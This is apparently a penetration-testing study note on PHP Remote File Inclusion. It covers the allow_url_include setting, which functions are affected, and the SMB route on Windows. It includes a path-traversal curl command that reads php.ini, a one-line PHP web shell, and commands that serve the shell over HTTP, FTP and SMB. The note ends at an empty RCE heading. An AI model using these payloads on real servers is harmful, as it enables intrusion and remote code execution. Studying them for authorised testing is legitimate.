###### PRIMARY CATEGORY → [[LFI]]

#### *Theory*

The main reason why it is difficult to see a *Remote File Inclusion* nowadays is because the *allow_url_include* *PHP* directive is disable by default

It allows the use of *URLs* with the following functions

```bash
include()
include_once()
require()
require_once()
```

Therefore, it is mandatory to check whether this directive is enabled or not

Moreover, it is necessary that the function to which the input data is passed supports *URLs* and evaluates the content in addition to including it, like the functions above

If the given function does not evaluate the content of the specified resource, we cannot carry out a *RFI*, but we can perform an *internal port discovery*, i.e. *[[SSRF]]*

> [!DANGER]- *SMB*
>
> If the vulnerable web application is hosted on a Windows machine, we do not need that the *allow_url_include* directive is enabled in order to carry out an RFI, as we can utilize the *SMB* protocol for this purpose
>
> This is because Windows treats files on remote *SMB* servers as normal files, which can be referenced via its *UNC* path
>

##### *Functions*

This functions would allow either *RFI* or *SSRF*

| ***FUNCTION*** | ***READ CONTENT*** | ***EXECUTE*** | ***REMOTE URL*** |
| --- | --- | --- | --- |
| **`include()`** <br> **`include_once()`** | ✔ | ✔ | ✔ |
| **`require()`** <br> **`require_once()`** | ✔ | ✔ | ✔ |
| **`file_get_contents()`** | ✔ | ❌ | ✔ |

#### *Verifying RFI*

As stated, first we must check whether the *allow_url_include* directive is enabled or not

To do so, we can proceed as follows by leveraging the discovered *LFI*

```bash
curl --silent --location --request GET "https://www.domain.com/index.php?language=../../../etc/php/8.1/fpm/php.ini" | grep -iP --color -- '^allow_url_include=.*$'
```

We simply list the content of the current *PHP* configuration file and filter by the directive

Moreover, we have to check if the vulnerable function allows *URLs* and evaluates the content of the specified resource

We can verify this by requesting a *PHP* resource providing an *URL*

```bash
?language=http://127.0.0.1/index.php
```

If the content of the specified resource is listed, the given function allows *URLs*. Moreover, if the resource is not included as source code but rather executed and rendered as *PHP*, it allows *PHP* execution as well, therefore being an *RFI*

#### *Abuse*

##### *Creating a Web Shell*

```bash
echo -n "<?php system($_GET[0]); ?>" > shell.php
```

##### *Setting up a Server*

###### *HTTP*

```bash
python3 -m http.server 80 # or 443
```

###### *FTP*

```bash
python3 pyftpdlib -p 21
```

###### *SMB*

```bash
smbserver.py -smb2support smbFolder "$( pwd )"
```

##### *RCE*
